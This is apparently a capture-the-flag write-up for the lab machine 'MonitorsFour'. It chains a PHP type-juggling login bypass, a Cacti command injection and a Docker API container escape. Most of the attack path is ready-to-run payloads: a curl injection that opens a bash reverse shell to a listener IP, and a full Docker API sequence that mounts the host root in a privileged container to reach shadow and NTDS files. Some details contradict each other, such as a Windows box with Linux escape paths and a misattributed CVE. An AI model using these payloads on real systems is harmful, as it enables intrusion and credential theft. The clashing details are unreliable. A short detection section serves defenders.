---
layout: default
title: "MonitorsFour"
parent: Insane Machines
grand_parent: Machines
permalink: /machines/insane/monitorsfour/
---

# MonitorsFour

![Machine Badge](https://img.shields.io/badge/Machine-MonitorsFour-blue)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Insane-red)

| Property | Value |
|----------|-------|
| **OS** | Windows |
| **Difficulty** | Insane |
| **Release** | 2026-05-23 |
| **Tags** | #cacti #php-type-juggling #cve-chain #docker-api #container-escape |

---

## Summary

MonitorsFour is the fourth in 0xdf's Monitors series. Initial access exploits a **PHP type-juggling** weakness in Cacti's authentication / installation flow paired with a Cacti CVE chain for RCE. Privilege escalation pivots from the Cacti container to the host by abusing the **Docker API socket** (bound to a network port or via volume-mounted `docker.sock`) - spawning a privileged container with the host root filesystem bind-mounted yields SYSTEM-equivalent on the underlying host.

---

## External Writeups

- [0xdf - HTB MonitorsFour](https://0xdf.gitlab.io/2026/05/23/htb-monitorsfour.html)

---

## Key Techniques

- PHP loose comparison (`==`) type juggling for auth bypass
- Cacti SQL injection / command injection CVE chain
- `$_REQUEST` / mass-assignment exploitation in Cacti
- Docker API abuse over TCP (`2375/tcp` or `2376/tcp`)
- Container -> host escape via privileged container with `-v /:/host`
- Recovery of host credentials from `/host/etc/shadow` or `/host/Users/.../NTDS`

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC monitorsfour.htb
# 80, 443  -> Cacti
# 2375     -> Docker API (filtered or exposed depending on network position)
```

### 2. PHP Type-Juggling Auth Bypass

Cacti's login / token comparison historically uses `==` instead of `===`. PHP coerces:

```php
"0e1234567890" == "0e9876543210"  // both interpret as 0.0 * 10^n -> true
md5("240610708") == 0             // true via implicit number coercion
```

Submit a username/token whose MD5 starts with `0e` followed by digits to satisfy a vulnerable comparison.

### 3. Cacti Command Injection (Chain)

Recent Cacti chain (CVE-2022-46169, CVE-2023-39361 et al.): authenticated (or unauth via guest poller) command injection in `remote_agent.php` polling host parameter. Payload:

```bash
curl -s "http://monitorsfour.htb/cacti/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1';"
```

Listener returns shell as the Cacti container's web user.

### 4. Container Enumeration -> Docker API Discovery

```bash
# Inside Cacti container
cat /proc/1/cgroup            # confirms container
ip a; ss -ltnp                # 172.x.x.1 gateway is the host
curl -s http://172.x.x.1:2375/version
# {"Version":"24.0.x", ...}
```

The Docker API is reachable from inside the container (common misconfig: API bound to bridge gateway).

### 5. Container Escape via Docker API

```bash
# Create privileged container with host root mounted
curl -s -X POST http://172.x.x.1:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{
        "Image":"alpine",
        "Cmd":["/bin/sh","-c","chroot /host bash"],
        "HostConfig":{"Binds":["/:/host"],"Privileged":true},
        "AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"OpenStdin":true
      }'
curl -s -X POST http://172.x.x.1:2375/containers/pwn/start
curl -s -X POST 'http://172.x.x.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
```

The attached process has full host filesystem at `/host` - read flags, dump SAM/NTDS, or write SSH keys.

---

## Lessons Learned

- **PHP `==` is forever dangerous.** A 2026 Insane box still pivots on type-juggling first introduced to the world in 2011.
- **Cacti** continues to be a recurring HTB theme - the Monitors series alone has produced four boxes around it.
- **Docker API on TCP without TLS** is one of the highest-impact misconfigurations in container environments. The `2375/tcp` port is a free root escalator from any pod / container that can reach it.
- The `Binds: ["/:/host"]` + `Privileged: true` JSON payload is the canonical container-escape primitive - memorize it.

---

## Indicators / Detection

- HTTP requests to `remote_agent.php` with `;` or backticks in `host_id`.
- `dockerd` accept-log entries from non-localhost source IPs.
- New container creation with `HostConfig.Binds` containing `/:`, `Privileged: true`, or `PidMode: host`.
- Unexpected `chroot` system calls from container processes.

---

## References

- Cacti `remote_agent.php` CVE-2022-46169 (auth bypass + RCE chain)
- Docker daemon TCP socket hardening: https://docs.docker.com/engine/security/protect-access/
- 0xdf Monitors series: Monitors, MonitorsTwo, MonitorsThree, MonitorsFour
